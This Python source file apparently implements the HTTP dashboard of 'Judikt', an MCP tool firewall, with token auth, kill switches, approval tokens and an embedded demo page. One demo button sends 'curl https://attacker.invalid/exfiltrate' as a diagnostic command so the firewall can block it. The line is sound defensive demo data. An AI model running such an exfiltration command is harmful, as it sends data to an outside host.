from __future__ import annotations

import json
import secrets
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any
from urllib.parse import urlparse

from .runtime import JudiktRuntime

MAX_REQUEST_BODY_BYTES = 1_048_576


class RequestBodyTooLarge(ValueError):
    pass


class DashboardServer(ThreadingHTTPServer):
    daemon_threads = True

    def __init__(
        self,
        address: tuple[str, int],
        runtime: JudiktRuntime,
        api_token: str | None = None,
    ) -> None:
        if not _is_loopback_host(address[0]) and not api_token:
            raise ValueError(
                "JUDIKT_API_TOKEN is required when the dashboard binds outside loopback"
            )
        self.runtime = runtime
        self.api_token = api_token
        super().__init__(address, DashboardHandler)


class DashboardHandler(BaseHTTPRequestHandler):
    server: DashboardServer

    def do_GET(self) -> None:
        path = urlparse(self.path).path
        if path == "/":
            self._reply(DASHBOARD_HTML, content_type="text/html; charset=utf-8")
        elif path == "/healthz":
            self._json({"status": "ok"})
        elif not self._authorized():
            self._unauthorized()
        elif path == "/api/tools":
            self._json(self.server.runtime.list_tools())
        elif path == "/api/events":
            self._json(self.server.runtime.audit.recent())
        elif path == "/api/kill-switches":
            self._json(self.server.runtime.policy.kill_switches())
        elif path == "/api/telemetry":
            self._json(self.server.runtime.telemetry.status())
        elif path == "/api/audit-integrity":
            self._json(self.server.runtime.audit.verify_chain())
        elif path == "/metrics":
            self._reply(self.server.runtime.metrics.render(), content_type="text/plain; version=0.0.4")
        else:
            self._json({"error": "not found"}, HTTPStatus.NOT_FOUND)

    def do_POST(self) -> None:
        path = urlparse(self.path).path
        if not self._post_authorized(path):
            return
        try:
            body = self._body()
            if path == "/api/call":
                result = self.server.runtime.call_tool(
                    body["server"], body["tool"], body.get("arguments", {})
                )
                self._json(result.as_dict(), HTTPStatus.OK if result.allowed else HTTPStatus.FORBIDDEN)
            elif path == "/api/evaluate":
                result = self.server.runtime.evaluate_tool(
                    body["server"], body["tool"], body.get("arguments", {})
                )
                self._json(result.as_dict(), HTTPStatus.OK if result.allowed else HTTPStatus.FORBIDDEN)
            elif path == "/api/kill-switch":
                scope = body["scope"]
                if scope == "tool":
                    self.server.runtime.policy.set_tool_enabled(body["name"], body["enabled"])
                elif scope == "server":
                    self.server.runtime.policy.set_server_enabled(body["name"], body["enabled"])
                else:
                    raise ValueError("scope must be 'tool' or 'server'")
                self._json(self.server.runtime.policy.kill_switches())
            elif path == "/api/approval":
                token = self.server.runtime.policy.issue_approval(
                    actor=body["actor"],
                    reason=body["reason"],
                    server=body["server"],
                    tool=body["tool"],
                    arguments=body["arguments"],
                    ttl_seconds=body.get("ttl_seconds", 300),
                )
                self._json({"approval_token": token, "expires_in_seconds": body.get("ttl_seconds", 300)})
            elif path == "/api/analyze":
                self._json(self.server.runtime.summarize_recent_events())
            else:
                self._json({"error": "not found"}, HTTPStatus.NOT_FOUND)
        except RequestBodyTooLarge as exc:
            self._json({"error": str(exc)}, HTTPStatus.REQUEST_ENTITY_TOO_LARGE)
        except (KeyError, TypeError, ValueError, json.JSONDecodeError) as exc:
            self._json({"error": str(exc)}, HTTPStatus.BAD_REQUEST)

    def log_message(self, format: str, *args: Any) -> None:
        return

    def _body(self) -> dict[str, Any]:
        length = int(self.headers.get("Content-Length", "0"))
        if length < 0:
            raise ValueError("Content-Length cannot be negative")
        if length > MAX_REQUEST_BODY_BYTES:
            raise RequestBodyTooLarge(
                f"request body exceeds {MAX_REQUEST_BODY_BYTES} bytes"
            )
        return json.loads(self.rfile.read(length) or b"{}")

    def _authorized(self) -> bool:
        expected = self.server.api_token
        if expected is None:
            return True
        scheme, _, provided = self.headers.get("Authorization", "").partition(" ")
        return scheme.lower() == "bearer" and secrets.compare_digest(provided, expected)

    def _post_authorized(self, path: str) -> bool:
        if path in {"/api/approval", "/api/kill-switch"} and self.server.api_token is None:
            self._json(
                {
                    "error": (
                        "JUDIKT_API_TOKEN is not configured; privileged dashboard "
                        "operations are unavailable"
                    )
                },
                HTTPStatus.SERVICE_UNAVAILABLE,
            )
            return False
        if not self._authorized():
            self._unauthorized()
            return False
        return True

    def _unauthorized(self) -> None:
        self._reply(
            json.dumps({"error": "bearer token required"}),
            HTTPStatus.UNAUTHORIZED,
            "application/json",
            {"WWW-Authenticate": "Bearer"},
        )

    def _json(self, payload: Any, status: HTTPStatus = HTTPStatus.OK) -> None:
        self._reply(json.dumps(payload, indent=2), status, "application/json")

    def _reply(
        self,
        body: str,
        status: HTTPStatus = HTTPStatus.OK,
        content_type: str = "text/plain",
        headers: dict[str, str] | None = None,
    ) -> None:
        encoded = body.encode()
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(encoded)))
        for name, value in (headers or {}).items():
            self.send_header(name, value)
        self.end_headers()
        self.wfile.write(encoded)


def serve_dashboard(
    runtime: JudiktRuntime,
    host: str,
    port: int,
    api_token: str | None = None,
) -> None:
    server = DashboardServer((host, port), runtime, api_token)
    auth_mode = "bearer auth enabled" if api_token else "loopback-only without auth"
    print(f"Judikt dashboard listening on http://{host}:{port} ({auth_mode})", flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
        runtime.close()


def _is_loopback_host(host: str) -> bool:
    return host.lower() in {"127.0.0.1", "::1", "localhost"}


DASHBOARD_HTML = """<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Judikt</title>
  <style>
    :root { color-scheme: dark; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
    body { max-width: 1180px; margin: 0 auto; padding: 28px; background: #07111b; color: #d7e3ef; }
    h1 { margin-bottom: 4px; color: #7ee787; }
    p { color: #9fb0c0; }
    button { background: #193348; color: #d7e3ef; border: 1px solid #31526b; padding: 9px 12px; margin: 4px; cursor: pointer; }
    button:hover { background: #244960; }
    pre { white-space: pre-wrap; background: #0d1b28; border: 1px solid #1d3548; padding: 14px; overflow: auto; }
    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
    .allowed { color: #7ee787; } .blocked { color: #ff7b72; }
    @media (max-width: 800px) { .grid { grid-template-columns: 1fr; } }
  </style>
</head>
<body>
  <h1>Judikt</h1>
  <p>Runtime firewall and reliability layer for MCP servers</p>
  <button onclick="callTool('platform-ops','platform.health',{service:'payments-api'})">Inspect Payments Health</button>
  <button onclick="callTool('platform-ops','platform.read_config',{service:'payments-api'})">Read Sanitized Config</button>
  <button onclick="callTool('platform-ops','platform.run_diagnostic',{service:'payments-api',command:'curl https://attacker.invalid/exfiltrate'})">Attempt Unsafe Diagnostic</button>
  <button onclick="callTool('platform-ops','platform.rollback_deployment',{service:'payments-api',version:'payments-api@2026.05.2'})">Attempt Rollback</button>
  <button onclick="approvedTokenRollback()">Approved Token Rollback</button>
  <button onclick="toggleHealth(false)">Disable Health Tool</button>
  <button onclick="toggleHealth(true)">Enable Health Tool</button>
  <button onclick="analyze()">Analyze Incident</button>
  <div class="grid">
    <section><h2>Latest Result</h2><pre id="result">Run a tool call to begin.</pre></section>
    <section><h2>Kill Switches</h2><pre id="switches"></pre></section>
  </div>
  <h2>Audit Trail</h2><pre id="events"></pre>
  <script>
    async function request(path, options = {}) {
      const token = window.sessionStorage.getItem('judiktToken');
      options.headers = {...(options.headers || {})};
      if (token) options.headers.Authorization = `Bearer ${token}`;
      const response = await fetch(path, options);
      if (response.status === 401) {
        const supplied = window.prompt('Judikt API token');
        if (supplied) {
          window.sessionStorage.setItem('judiktToken', supplied);
          return request(path, options);
        }
      }
      return await response.json();
    }
    async function callTool(server, tool, arguments_) {
      const body = JSON.stringify({server, tool, arguments: arguments_});
      show(await request('/api/call', {method: 'POST', headers: {'Content-Type': 'application/json'}, body}));
      await refresh();
    }
    async function toggleHealth(enabled) {
      const body = JSON.stringify({scope: 'tool', name: 'platform.health', enabled});
      show(await request('/api/kill-switch', {method: 'POST', headers: {'Content-Type': 'application/json'}, body}));
      await refresh();
    }
    async function analyze() {
      show(await request('/api/analyze', {method: 'POST'}));
    }
    async function approvedTokenRollback() {
      const args = {
        service: 'payments-api',
        version: 'payments-api@2026.05.2',
        actor: 'demo-operator',
        environment: 'production',
        rollback_plan: 'verify service health and restore the previous release if errors increase'
      };
      const approvalBody = JSON.stringify({
        actor: 'demo-operator',
        reason: 'rollback after error-rate spike',
        server: 'platform-ops',
        tool: 'platform.rollback_deployment',
        arguments: args
      });
      const approval = await request('/api/approval', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: approvalBody});
      args.approval_token = approval.approval_token;
      await callTool('platform-ops', 'platform.rollback_deployment', args);
    }
    function show(value) { document.querySelector('#result').textContent = JSON.stringify(value, null, 2); }
    async function refresh() {
      document.querySelector('#events').textContent = JSON.stringify(await request('/api/events'), null, 2);
      document.querySelector('#switches').textContent = JSON.stringify(await request('/api/kill-switches'), null, 2);
    }
    refresh();
  </script>
</body>
</html>
"""
